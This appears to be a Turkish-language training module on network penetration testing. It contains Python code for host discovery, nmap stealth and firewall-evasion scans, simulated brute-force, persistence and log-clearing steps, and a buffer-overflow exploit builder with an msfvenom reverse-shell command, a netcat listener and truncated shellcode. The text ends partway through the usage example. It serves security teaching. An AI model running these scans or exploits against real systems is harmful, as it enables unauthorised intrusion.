# Aƒü Penetrasyon Testi

## üéØ √ñƒürenme Hedefleri

Bu mod√ºlde aƒü penetrasyon testinin temellerini, metodolojilerini ve pratik uygulamalarƒ±nƒ± √∂ƒüreneceksiniz.

### üìö Teorik Bilgi
- Aƒü penetrasyon testi metodolojileri
- Aƒü ke≈üif teknikleri
- Zafiyet tarama ve deƒüerlendirme
- Exploit geli≈ütirme ve kullanƒ±mƒ±
- Post-exploitation teknikleri
- Lateral movement stratejileri

### üõ†Ô∏è Pratik Beceriler
- Nmap ile geli≈ümi≈ü aƒü tarama
- Metasploit Framework kullanƒ±mƒ±
- Custom exploit geli≈ütirme
- Privilege escalation teknikleri
- Network pivoting
- Steganografi ve veri gizleme

### üîß Teknik Yetkinlikler
- TCP/IP protokol analizi
- Wireless network penetration
- VPN ve tunnel analizi
- Active Directory saldƒ±rƒ±larƒ±
- SNMP ve network service exploitation
- Traffic analysis ve packet crafting

### üåê Ger√ßek D√ºnya Uygulamalarƒ±
- Kurumsal aƒü g√ºvenlik deƒüerlendirmesi
- Red team operasyonlarƒ±
- Compliance testing (PCI DSS, SOX)
- Critical infrastructure protection

## üìñ Temel Kavramlar

### Aƒü Penetrasyon Testi Ya≈üam D√∂ng√ºs√º

```python
#!/usr/bin/env python3
"""
Aƒü Penetrasyon Testi Ya≈üam D√∂ng√ºs√º Framework
Author: ibrahimsql
Description: Sistematik aƒü penetrasyon testi s√ºre√ßleri
"""

import subprocess
import json
import xml.etree.ElementTree as ET
from datetime import datetime
import ipaddress
import socket
import threading
import time

class NetworkPentestFramework:
    def __init__(self, target_network):
        self.target_network = target_network
        self.discovered_hosts = []
        self.open_ports = {}
        self.vulnerabilities = []
        self.exploited_hosts = []
        self.report_data = {
            'start_time': datetime.now().isoformat(),
            'target': target_network,
            'phases': {}
        }
    
    def phase_1_reconnaissance(self):
        """Faz 1: Ke≈üif ve Bilgi Toplama"""
        print("[+] Faz 1: Reconnaissance ba≈ülatƒ±lƒ±yor...")
        
        # Passive reconnaissance
        passive_info = self.passive_reconnaissance()
        
        # Active reconnaissance
        active_info = self.active_reconnaissance()
        
        self.report_data['phases']['reconnaissance'] = {
            'passive': passive_info,
            'active': active_info,
            'timestamp': datetime.now().isoformat()
        }
        
        return passive_info, active_info
    
    def passive_reconnaissance(self):
        """Pasif ke≈üif teknikleri"""
        info = {
            'dns_enumeration': [],
            'whois_data': {},
            'search_engine_recon': [],
            'social_media_intel': []
        }
        
        # DNS enumeration
        try:
            # DNS zone transfer attempt
            dns_servers = self.find_dns_servers()
            for dns_server in dns_servers:
                zone_data = self.attempt_zone_transfer(dns_server)
                if zone_data:
                    info['dns_enumeration'].append({
                        'server': dns_server,
                        'zone_data': zone_data
                    })
        except Exception as e:
            print(f"[-] DNS enumeration hatasƒ±: {e}")
        
        return info
    
    def active_reconnaissance(self):
        """Aktif ke≈üif teknikleri"""
        info = {
            'host_discovery': [],
            'port_scanning': {},
            'service_enumeration': {},
            'os_fingerprinting': {}
        }
        
        # Host discovery
        self.discovered_hosts = self.discover_hosts()
        info['host_discovery'] = self.discovered_hosts
        
        # Port scanning for each discovered host
        for host in self.discovered_hosts:
            ports = self.port_scan(host)
            self.open_ports[host] = ports
            info['port_scanning'][host] = ports
            
            # Service enumeration
            services = self.enumerate_services(host, ports)
            info['service_enumeration'][host] = services
            
            # OS fingerprinting
            os_info = self.os_fingerprint(host)
            info['os_fingerprinting'][host] = os_info
        
        return info
    
    def discover_hosts(self):
        """Aƒüdaki aktif hostlarƒ± ke≈üfet"""
        hosts = []
        network = ipaddress.ip_network(self.target_network, strict=False)
        
        print(f"[+] {network} aƒüƒ±nda host ke≈üfi yapƒ±lƒ±yor...")
        
        # Ping sweep
        for ip in network.hosts():
            if self.ping_host(str(ip)):
                hosts.append(str(ip))
                print(f"[+] Aktif host bulundu: {ip}")
        
        return hosts
    
    def ping_host(self, host):
        """Host'un aktif olup olmadƒ±ƒüƒ±nƒ± kontrol et"""
        try:
            result = subprocess.run(
                ['ping', '-c', '1', '-W', '1000', host],
                capture_output=True,
                text=True,
                timeout=2
            )
            return result.returncode == 0
        except:
            return False
    
    def port_scan(self, host):
        """Belirtilen host'ta port taramasƒ± yap"""
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080]
        
        print(f"[+] {host} i√ßin port taramasƒ± yapƒ±lƒ±yor...")
        
        for port in common_ports:
            if self.check_port(host, port):
                open_ports.append(port)
                print(f"[+] A√ßƒ±k port bulundu: {host}:{port}")
        
        return open_ports
    
    def check_port(self, host, port):
        """Belirtilen port'un a√ßƒ±k olup olmadƒ±ƒüƒ±nƒ± kontrol et"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def enumerate_services(self, host, ports):
        """A√ßƒ±k portlardaki servisleri enumerate et"""
        services = {}
        
        for port in ports:
            try:
                service_info = self.banner_grab(host, port)
                services[port] = service_info
            except Exception as e:
                services[port] = f"Error: {e}"
        
        return services
    
    def banner_grab(self, host, port):
        """Banner grabbing ile servis bilgisi al"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            
            # HTTP banner grabbing
            if port in [80, 443, 8080]:
                sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            else:
                sock.send(b"\r\n")
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            return banner.strip()
        except:
            return "No banner"
    
    def os_fingerprint(self, host):
        """ƒ∞≈ületim sistemi parmak izi alma"""
        try:
            # Nmap OS detection
            result = subprocess.run(
                ['nmap', '-O', host],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Parse nmap output for OS info
            lines = result.stdout.split('\n')
            os_info = []
            
            for line in lines:
                if 'OS details:' in line or 'Running:' in line:
                    os_info.append(line.strip())
            
            return os_info
        except:
            return ["OS detection failed"]
    
    def phase_2_scanning(self):
        """Faz 2: Tarama ve Numaralandƒ±rma"""
        print("[+] Faz 2: Scanning & Enumeration ba≈ülatƒ±lƒ±yor...")
        
        scanning_results = {
            'vulnerability_scan': {},
            'service_enumeration': {},
            'web_enumeration': {},
            'smb_enumeration': {}
        }
        
        for host in self.discovered_hosts:
            # Vulnerability scanning
            vulns = self.vulnerability_scan(host)
            scanning_results['vulnerability_scan'][host] = vulns
            
            # Detailed service enumeration
            if 80 in self.open_ports.get(host, []) or 443 in self.open_ports.get(host, []):
                web_enum = self.web_enumeration(host)
                scanning_results['web_enumeration'][host] = web_enum
            
            if 445 in self.open_ports.get(host, []) or 139 in self.open_ports.get(host, []):
                smb_enum = self.smb_enumeration(host)
                scanning_results['smb_enumeration'][host] = smb_enum
        
        self.report_data['phases']['scanning'] = {
            'results': scanning_results,
            'timestamp': datetime.now().isoformat()
        }
        
        return scanning_results
    
    def vulnerability_scan(self, host):
        """Zafiyet taramasƒ± yap"""
        vulnerabilities = []
        
        try:
            # Nmap vulnerability scripts
            result = subprocess.run(
                ['nmap', '--script', 'vuln', host],
                capture_output=True,
                text=True,
                timeout=300
            )
            
            # Parse vulnerability results
            lines = result.stdout.split('\n')
            current_vuln = None
            
            for line in lines:
                if '|' in line and 'CVE-' in line:
                    vulnerabilities.append(line.strip())
                elif 'VULNERABLE:' in line:
                    vulnerabilities.append(line.strip())
        
        except Exception as e:
            vulnerabilities.append(f"Vulnerability scan error: {e}")
        
        return vulnerabilities
    
    def web_enumeration(self, host):
        """Web servisi enumeration"""
        web_info = {
            'directories': [],
            'technologies': [],
            'forms': [],
            'cookies': []
        }
        
        try:
            # Directory enumeration with common paths
            common_dirs = ['admin', 'login', 'backup', 'config', 'test', 'dev', 'api']
            
            for directory in common_dirs:
                url = f"http://{host}/{directory}"
                if self.check_web_path(url):
                    web_info['directories'].append(directory)
        
        except Exception as e:
            web_info['error'] = str(e)
        
        return web_info
    
    def check_web_path(self, url):
        """Web path'inin var olup olmadƒ±ƒüƒ±nƒ± kontrol et"""
        try:
            import urllib.request
            response = urllib.request.urlopen(url, timeout=5)
            return response.getcode() == 200
        except:
            return False
    
    def smb_enumeration(self, host):
        """SMB servisi enumeration"""
        smb_info = {
            'shares': [],
            'users': [],
            'os_info': ''
        }
        
        try:
            # SMB share enumeration
            result = subprocess.run(
                ['smbclient', '-L', host, '-N'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            lines = result.stdout.split('\n')
            for line in lines:
                if 'Disk' in line or 'IPC' in line:
                    smb_info['shares'].append(line.strip())
        
        except Exception as e:
            smb_info['error'] = str(e)
        
        return smb_info
    
    def phase_3_gaining_access(self):
        """Faz 3: Eri≈üim Kazanma"""
        print("[+] Faz 3: Gaining Access ba≈ülatƒ±lƒ±yor...")
        
        exploitation_results = {
            'successful_exploits': [],
            'failed_attempts': [],
            'shells_obtained': []
        }
        
        for host in self.discovered_hosts:
            # Exploit attempts based on discovered vulnerabilities
            exploits = self.attempt_exploitation(host)
            exploitation_results['successful_exploits'].extend(exploits['successful'])
            exploitation_results['failed_attempts'].extend(exploits['failed'])
            
            if exploits['successful']:
                self.exploited_hosts.append(host)
                exploitation_results['shells_obtained'].append(host)
        
        self.report_data['phases']['gaining_access'] = {
            'results': exploitation_results,
            'timestamp': datetime.now().isoformat()
        }
        
        return exploitation_results
    
    def attempt_exploitation(self, host):
        """Host'a kar≈üƒ± exploit denemeleri yap"""
        results = {
            'successful': [],
            'failed': []
        }
        
        # Common exploit attempts
        exploits_to_try = [
            self.try_ssh_bruteforce,
            self.try_web_exploits,
            self.try_smb_exploits,
            self.try_service_exploits
        ]
        
        for exploit_func in exploits_to_try:
            try:
                success = exploit_func(host)
                if success:
                    results['successful'].append({
                        'host': host,
                        'exploit': exploit_func.__name__,
                        'timestamp': datetime.now().isoformat()
                    })
                else:
                    results['failed'].append({
                        'host': host,
                        'exploit': exploit_func.__name__,
                        'reason': 'Exploit failed'
                    })
            except Exception as e:
                results['failed'].append({
                    'host': host,
                    'exploit': exploit_func.__name__,
                    'reason': str(e)
                })
        
        return results
    
    def try_ssh_bruteforce(self, host):
        """SSH brute force denemesi"""
        if 22 not in self.open_ports.get(host, []):
            return False
        
        # Common credentials
        credentials = [
            ('admin', 'admin'),
            ('root', 'root'),
            ('admin', 'password'),
            ('user', 'user')
        ]
        
        for username, password in credentials:
            try:
                # SSH connection attempt (simulated)
                print(f"[*] SSH brute force deneniyor: {username}:{password}@{host}")
                # In real scenario, use paramiko or similar
                time.sleep(0.1)  # Rate limiting
            except:
                continue
        
        return False  # Simulated failure
    
    def try_web_exploits(self, host):
        """Web exploit denemeleri"""
        if not any(port in [80, 443, 8080] for port in self.open_ports.get(host, [])):
            return False
        
        # Common web exploits
        web_exploits = [
            'SQL Injection',
            'XSS',
            'Directory Traversal',
            'File Upload'
        ]
        
        for exploit in web_exploits:
            print(f"[*] Web exploit deneniyor: {exploit} on {host}")
            # Simulated exploit attempt
            time.sleep(0.1)
        
        return False  # Simulated failure
    
    def try_smb_exploits(self, host):
        """SMB exploit denemeleri"""
        if not any(port in [139, 445] for port in self.open_ports.get(host, [])):
            return False
        
        print(f"[*] SMB exploit deneniyor: {host}")
        # EternalBlue, SMBGhost gibi exploitler
        return False  # Simulated failure
    
    def try_service_exploits(self, host):
        """Diƒüer servis exploitlarƒ±"""
        for port in self.open_ports.get(host, []):
            print(f"[*] Service exploit deneniyor: {host}:{port}")
            # Port-specific exploits
        
        return False  # Simulated failure
    
    def phase_4_maintaining_access(self):
        """Faz 4: Eri≈üimi S√ºrd√ºrme"""
        print("[+] Faz 4: Maintaining Access ba≈ülatƒ±lƒ±yor...")
        
        persistence_results = {
            'backdoors_installed': [],
            'persistence_mechanisms': [],
            'privilege_escalation': []
        }
        
        for host in self.exploited_hosts:
            # Install persistence mechanisms
            persistence = self.install_persistence(host)
            persistence_results['persistence_mechanisms'].extend(persistence)
            
            # Privilege escalation
            privesc = self.privilege_escalation(host)
            persistence_results['privilege_escalation'].extend(privesc)
        
        self.report_data['phases']['maintaining_access'] = {
            'results': persistence_results,
            'timestamp': datetime.now().isoformat()
        }
        
        return persistence_results
    
    def install_persistence(self, host):
        """Persistence mekanizmalarƒ± kur"""
        mechanisms = []
        
        # Simulated persistence installation
        persistence_types = [
            'Registry modification',
            'Service installation',
            'Scheduled task',
            'Startup folder'
        ]
        
        for mechanism in persistence_types:
            print(f"[*] Persistence kuruluyor: {mechanism} on {host}")
            mechanisms.append({
                'host': host,
                'type': mechanism,
                'status': 'simulated',
                'timestamp': datetime.now().isoformat()
            })
        
        return mechanisms
    
    def privilege_escalation(self, host):
        """Privilege escalation denemeleri"""
        escalations = []
        
        # Common privilege escalation techniques
        techniques = [
            'Kernel exploits',
            'SUID binaries',
            'Sudo misconfigurations',
            'Service exploits'
        ]
        
        for technique in techniques:
            print(f"[*] Privilege escalation deneniyor: {technique} on {host}")
            escalations.append({
                'host': host,
                'technique': technique,
                'status': 'attempted',
                'timestamp': datetime.now().isoformat()
            })
        
        return escalations
    
    def phase_5_covering_tracks(self):
        """Faz 5: ƒ∞zleri Silme"""
        print("[+] Faz 5: Covering Tracks ba≈ülatƒ±lƒ±yor...")
        
        cleanup_results = {
            'logs_cleared': [],
            'files_removed': [],
            'registry_cleaned': []
        }
        
        for host in self.exploited_hosts:
            cleanup = self.cleanup_evidence(host)
            cleanup_results['logs_cleared'].extend(cleanup['logs'])
            cleanup_results['files_removed'].extend(cleanup['files'])
            cleanup_results['registry_cleaned'].extend(cleanup['registry'])
        
        self.report_data['phases']['covering_tracks'] = {
            'results': cleanup_results,
            'timestamp': datetime.now().isoformat()
        }
        
        return cleanup_results
    
    def cleanup_evidence(self, host):
        """Kanƒ±tlarƒ± temizle"""
        cleanup = {
            'logs': [],
            'files': [],
            'registry': []
        }
        
        # Simulated cleanup operations
        print(f"[*] ƒ∞zler temizleniyor: {host}")
        
        cleanup['logs'].append({
            'host': host,
            'log_type': 'System logs',
            'action': 'cleared',
            'timestamp': datetime.now().isoformat()
        })
        
        cleanup['files'].append({
            'host': host,
            'file_type': 'Temporary files',
            'action': 'removed',
            'timestamp': datetime.now().isoformat()
        })
        
        return cleanup
    
    def generate_report(self):
        """Penetrasyon testi raporu olu≈ütur"""
        self.report_data['end_time'] = datetime.now().isoformat()
        self.report_data['summary'] = {
            'total_hosts_discovered': len(self.discovered_hosts),
            'total_hosts_exploited': len(self.exploited_hosts),
            'total_vulnerabilities': len(self.vulnerabilities),
            'success_rate': len(self.exploited_hosts) / len(self.discovered_hosts) if self.discovered_hosts else 0
        }
        
        # Save report to file
        report_filename = f"network_pentest_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(report_filename, 'w') as f:
            json.dump(self.report_data, f, indent=2)
        
        print(f"[+] Rapor olu≈üturuldu: {report_filename}")
        return report_filename
    
    def run_full_pentest(self):
        """Tam penetrasyon testi s√ºrecini √ßalƒ±≈ütƒ±r"""
        print("[+] Aƒü Penetrasyon Testi ba≈ülatƒ±lƒ±yor...")
        print(f"[+] Hedef aƒü: {self.target_network}")
        
        try:
            # Faz 1: Reconnaissance
            self.phase_1_reconnaissance()
            
            # Faz 2: Scanning
            self.phase_2_scanning()
            
            # Faz 3: Gaining Access
            self.phase_3_gaining_access()
            
            # Faz 4: Maintaining Access
            self.phase_4_maintaining_access()
            
            # Faz 5: Covering Tracks
            self.phase_5_covering_tracks()
            
            # Rapor olu≈ütur
            report_file = self.generate_report()
            
            print("[+] Penetrasyon testi tamamlandƒ±!")
            return report_file
            
        except Exception as e:
            print(f"[-] Penetrasyon testi hatasƒ±: {e}")
            return None

# Kullanƒ±m √∂rneƒüi
if __name__ == "__main__":
    # Hedef aƒü belirle (sadece test ortamƒ±nda kullanƒ±n!)
    target_network = "192.168.1.0/24"
    
    # Penetrasyon testi framework'√ºn√º ba≈ülat
    pentest = NetworkPentestFramework(target_network)
    
    # Tam penetrasyon testini √ßalƒ±≈ütƒ±r
    report = pentest.run_full_pentest()
    
    if report:
        print(f"[+] Penetrasyon testi raporu: {report}")
```

## üîç Geli≈ümi≈ü Aƒü Tarama Teknikleri

### Nmap ile Geli≈ümi≈ü Tarama

```python
#!/usr/bin/env python3
"""
Geli≈ümi≈ü Nmap Tarama Ara√ßlarƒ±
Author: ibrahimsql
Description: Nmap ile geli≈ümi≈ü aƒü tarama teknikleri
"""

import subprocess
import xml.etree.ElementTree as ET
import json
from datetime import datetime
import threading
import queue

class AdvancedNmapScanner:
    def __init__(self):
        self.scan_results = {}
        self.scan_queue = queue.Queue()
        self.threads = []
    
    def stealth_scan(self, target):
        """Stealth SYN tarama"""
        print(f"[+] Stealth SYN tarama ba≈ülatƒ±lƒ±yor: {target}")
        
        cmd = [
            'nmap',
            '-sS',  # SYN scan
            '-T2',  # Slow timing
            '-f',   # Fragment packets
            '--randomize-hosts',
            '--data-length', '25',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def comprehensive_scan(self, target):
        """Kapsamlƒ± tarama"""
        print(f"[+] Kapsamlƒ± tarama ba≈ülatƒ±lƒ±yor: {target}")
        
        cmd = [
            'nmap',
            '-sS', '-sU',  # TCP SYN + UDP scan
            '-A',          # Aggressive scan
            '-T4',         # Aggressive timing
            '-p-',         # All ports
            '--script', 'default,vuln',
            '-oX', f'scan_{target.replace("/", "_")}.xml',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def service_version_scan(self, target):
        """Servis versiyonu tarama"""
        print(f"[+] Servis versiyonu tarama: {target}")
        
        cmd = [
            'nmap',
            '-sV',         # Version detection
            '--version-intensity', '9',
            '-T4',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def os_detection_scan(self, target):
        """ƒ∞≈ületim sistemi tespit tarama"""
        print(f"[+] OS detection tarama: {target}")
        
        cmd = [
            'nmap',
            '-O',          # OS detection
            '--osscan-guess',
            '--max-os-tries', '2',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def vulnerability_scan(self, target):
        """Zafiyet tarama"""
        print(f"[+] Vulnerability tarama: {target}")
        
        cmd = [
            'nmap',
            '--script', 'vuln',
            '--script-args', 'unsafe=1',
            '-T4',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def firewall_evasion_scan(self, target):
        """Firewall evasion tarama"""
        print(f"[+] Firewall evasion tarama: {target}")
        
        cmd = [
            'nmap',
            '-sS',
            '-f',          # Fragment packets
            '-D', 'RND:10', # Decoy scan
            '--source-port', '53',
            '--data-length', '25',
            '--randomize-hosts',
            '-T2',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def parse_nmap_output(self, output):
        """Nmap √ßƒ±ktƒ±sƒ±nƒ± parse et"""
        parsed_data = {
            'hosts': [],
            'scan_info': {},
            'timestamp': datetime.now().isoformat()
        }
        
        lines = output.split('\n')
        current_host = None
        
        for line in lines:
            line = line.strip()
            
            # Host information
            if 'Nmap scan report for' in line:
                if current_host:
                    parsed_data['hosts'].append(current_host)
                
                current_host = {
                    'ip': line.split()[-1].strip('()'),
                    'hostname': '',
                    'ports': [],
                    'os': [],
                    'services': []
                }
            
            # Port information
            elif '/tcp' in line or '/udp' in line:
                if current_host:
                    port_info = line.split()
                    if len(port_info) >= 3:
                        current_host['ports'].append({
                            'port': port_info[0],
                            'state': port_info[1],
                            'service': port_info[2] if len(port_info) > 2 else 'unknown'
                        })
            
            # OS information
            elif 'OS details:' in line or 'Running:' in line:
                if current_host:
                    current_host['os'].append(line)
        
        # Add last host
        if current_host:
            parsed_data['hosts'].append(current_host)
        
        return parsed_data
    
    def threaded_scan(self, targets, scan_type='stealth'):
        """√áoklu thread ile tarama"""
        print(f"[+] {len(targets)} hedef i√ßin threaded tarama ba≈ülatƒ±lƒ±yor...")
        
        # Add targets to queue
        for target in targets:
            self.scan_queue.put(target)
        
        # Start worker threads
        for i in range(min(5, len(targets))):
            thread = threading.Thread(target=self.scan_worker, args=(scan_type,))
            thread.start()
            self.threads.append(thread)
        
        # Wait for all threads to complete
        for thread in self.threads:
            thread.join()
        
        return self.scan_results
    
    def scan_worker(self, scan_type):
        """Thread worker fonksiyonu"""
        while not self.scan_queue.empty():
            try:
                target = self.scan_queue.get(timeout=1)
                
                if scan_type == 'stealth':
                    result = self.stealth_scan(target)
                elif scan_type == 'comprehensive':
                    result = self.comprehensive_scan(target)
                elif scan_type == 'service':
                    result = self.service_version_scan(target)
                elif scan_type == 'os':
                    result = self.os_detection_scan(target)
                elif scan_type == 'vuln':
                    result = self.vulnerability_scan(target)
                else:
                    result = self.stealth_scan(target)
                
                self.scan_results[target] = result
                self.scan_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                print(f"[-] Tarama hatasƒ±: {e}")
    
    def generate_scan_report(self, output_file='scan_report.json'):
        """Tarama raporu olu≈ütur"""
        report = {
            'scan_timestamp': datetime.now().isoformat(),
            'total_targets': len(self.scan_results),
            'results': self.scan_results,
            'summary': self.generate_summary()
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Tarama raporu olu≈üturuldu: {output_file}")
        return output_file
    
    def generate_summary(self):
        """Tarama √∂zeti olu≈ütur"""
        summary = {
            'total_hosts_scanned': len(self.scan_results),
            'hosts_with_open_ports': 0,
            'total_open_ports': 0,
            'common_services': {},
            'potential_vulnerabilities': 0
        }
        
        for target, result in self.scan_results.items():
            if 'error' not in result and 'hosts' in result:
                for host in result['hosts']:
                    if host['ports']:
                        summary['hosts_with_open_ports'] += 1
                        summary['total_open_ports'] += len(host['ports'])
                        
                        for port in host['ports']:
                            service = port.get('service', 'unknown')
                            summary['common_services'][service] = summary['common_services'].get(service, 0) + 1
        
        return summary

# Kullanƒ±m √∂rneƒüi
if __name__ == "__main__":
    scanner = AdvancedNmapScanner()
    
    # Tek hedef tarama
    target = "192.168.1.1"
    result = scanner.stealth_scan(target)
    print(json.dumps(result, indent=2))
    
    # √áoklu hedef tarama
    targets = ["192.168.1.1", "192.168.1.2", "192.168.1.3"]
    results = scanner.threaded_scan(targets, 'stealth')
    
    # Rapor olu≈ütur
    scanner.generate_scan_report('network_scan_report.json')
```

## üéØ Exploit Geli≈ütirme ve Kullanƒ±mƒ±

### Buffer Overflow Exploit Geli≈ütirme

```python
#!/usr/bin/env python3
"""
Buffer Overflow Exploit Geli≈ütirme Framework
Author: ibrahimsql
Description: Buffer overflow zafiyetlerini exploit etmek i√ßin framework
"""

import struct
import socket
import time
from pwn import *

class BufferOverflowExploit:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.offset = 0
        self.bad_chars = []
        self.return_address = 0
        self.shellcode = b""
    
    def find_offset(self, pattern_length=1000):
        """EIP offset'ini bul"""
        print("[+] EIP offset bulunuyor...")
        
        # Cyclic pattern olu≈ütur
        pattern = cyclic(pattern_length)
        
        try:
            # Hedef servise baƒülan
            conn = remote(self.target_ip, self.target_port)
            
            # Pattern'i g√∂nder
            conn.send(pattern)
            
            # Crash'i bekle
            time.sleep(2)
            conn.close()
            
            # Manuel olarak EIP deƒüerini kontrol et
            print("[*] Servis crash oldu. EIP deƒüerini manuel olarak kontrol edin.")
            print(f"[*] Pattern: {pattern[:100]}...")
            
        except Exception as e:
            print(f"[-] Offset bulma hatasƒ±: {e}")
    
    def set_offset(self, offset):
        """EIP offset'ini ayarla"""
        self.offset = offset
        print(f"[+] EIP offset ayarlandƒ±: {offset}")
    
    def find_bad_characters(self):
        """K√∂t√º karakterleri bul"""
        print("[+] K√∂t√º karakterler bulunuyor...")
        
        # T√ºm karakterleri i√ßeren string olu≈ütur
        all_chars = b""
        for i in range(1, 256):
            all_chars += struct.pack("B", i)
        
        # Buffer olu≈ütur
        buffer = b"A" * self.offset
        buffer += b"BBBB"  # EIP
        buffer += all_chars
        
        try:
            conn = remote(self.target_ip, self.target_port)
            conn.send(buffer)
            time.sleep(2)
            conn.close()
            
            print("[*] Karakterler g√∂nderildi. ESP'yi manuel olarak kontrol edin.")
            print("[*] Eksik veya deƒüi≈üen karakterler k√∂t√º karakterlerdir.")
            
        except Exception as e:
            print(f"[-] K√∂t√º karakter bulma hatasƒ±: {e}")
    
    def set_bad_characters(self, bad_chars):
        """K√∂t√º karakterleri ayarla"""
        self.bad_chars = bad_chars
        print(f"[+] K√∂t√º karakterler ayarlandƒ±: {[hex(c) for c in bad_chars]}")
    
    def find_jmp_esp(self):
        """JMP ESP adresini bul"""
        print("[+] JMP ESP adresi bulunuyor...")
        print("[*] Mona.py veya ROPgadget kullanarak JMP ESP adresi bulun:")
        print("[*] !mona jmp -r esp -cpb \"\\x00\\x0a\\x0d\"")
        print("[*] ROPgadget --binary program.exe --only 'jmp|call' | grep esp")
    
    def set_return_address(self, address):
        """Return adresini ayarla"""
        self.return_address = address
        print(f"[+] Return adresi ayarlandƒ±: {hex(address)}")
    
    def generate_shellcode(self, payload_type='reverse_shell', lhost='192.168.1.100', lport=4444):
        """Shellcode olu≈ütur"""
        print(f"[+] {payload_type} shellcode olu≈üturuluyor...")
        
        if payload_type == 'reverse_shell':
            # Windows reverse shell shellcode (msfvenom ile olu≈üturulmu≈ü)
            # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python -b "\x00\x0a\x0d"
            shellcode = (
                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                # ... (ger√ßek shellcode buraya gelecek)
            )
        elif payload_type == 'bind_shell':
            # Bind shell shellcode
            shellcode = b"\x90" * 100  # NOP sled + shellcode
        else:
            # Calc.exe shellcode (test i√ßin)
            shellcode = (
                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
            )
        
        # K√∂t√º karakterleri kontrol et
        for bad_char in self.bad_chars:
            if bad_char in shellcode:
                print(f"[-] Uyarƒ±: Shellcode k√∂t√º karakter i√ßeriyor: {hex(bad_char)}")
        
        self.shellcode = shellcode
        print(f"[+] Shellcode olu≈üturuldu ({len(shellcode)} bytes)")
        return shellcode
    
    def create_exploit_buffer(self):
        """Exploit buffer'ƒ±nƒ± olu≈ütur"""
        if not self.offset or not self.return_address or not self.shellcode:
            print("[-] Hata: Offset, return adresi veya shellcode eksik!")
            return None
        
        # Buffer olu≈ütur
        buffer = b"A" * self.offset
        buffer += struct.pack("<L", self.return_address)  # EIP
        buffer += b"\x90" * 16  # NOP sled
        buffer += self.shellcode
        
        print(f"[+] Exploit buffer olu≈üturuldu ({len(buffer)} bytes)")
        return buffer
    
    def test_exploit(self):
        """Exploit'i test et"""
        print("[+] Exploit test ediliyor...")
        
        buffer = self.create_exploit_buffer()
        if not buffer:
            return False
        
        try:
            conn = remote(self.target_ip, self.target_port)
            conn.send(buffer)
            
            # Shellcode'un √ßalƒ±≈ümasƒ±nƒ± bekle
            time.sleep(3)
            
            # Baƒülantƒ±yƒ± test et
            try:
                response = conn.recv(1024, timeout=2)
                print(f"[+] Yanƒ±t alƒ±ndƒ±: {response}")
                return True
            except:
                print("[*] Yanƒ±t alƒ±namadƒ±, ancak exploit √ßalƒ±≈ümƒ±≈ü olabilir")
                return True
                
        except Exception as e:
            print(f"[-] Exploit test hatasƒ±: {e}")
            return False
        finally:
            try:
                conn.close()
            except:
                pass
    
    def run_exploit(self):
        """Exploit'i √ßalƒ±≈ütƒ±r"""
        print("[+] Exploit √ßalƒ±≈ütƒ±rƒ±lƒ±yor...")
        
        buffer = self.create_exploit_buffer()
        if not buffer:
            return False
        
        try:
            # Listener ba≈ülat (reverse shell i√ßin)
            if 'reverse' in str(self.shellcode):
                print("[*] Reverse shell listener'ƒ± ba≈ülatƒ±n:")
                print("[*] nc -lvp 4444")
                input("[*] Listener hazƒ±r olduƒüunda Enter'a basƒ±n...")
            
            # Exploit g√∂nder
            conn = remote(self.target_ip, self.target_port)
            conn.send(buffer)
            
            print("[+] Exploit g√∂nderildi!")
            
            if 'bind' in str(self.shellcode):
                # Bind shell i√ßin baƒülantƒ± kur
                time.sleep(2)
                shell_conn = remote(self.target_ip, 4444)
                shell_conn.interactive()
            
            return True
            
        except Exception as e:
            print(f"[-] Exploit √ßalƒ±≈ütƒ±rma hatasƒ±: {e}")
            return False

# Kullanƒ±m √∂rneƒüi
if __name__ == "__main__":
    # Hedef bilgileri
    target_ip = "192.168.1.100"
    target_port = 9999
    
    # Exploit olu≈ütur
    exploit = BufferOverflowExploit(target_ip, target_port)
    
    # 1. Offset bul
    exploit.find_offset(1000)
    
    # 2. Offset'i ayarla (manuel olarak bulunduktan sonra)
    exploit.set_offset(146)
    
    # 3. K√∂t√º karakterleri bul
    exploit.find_bad_characters()
    
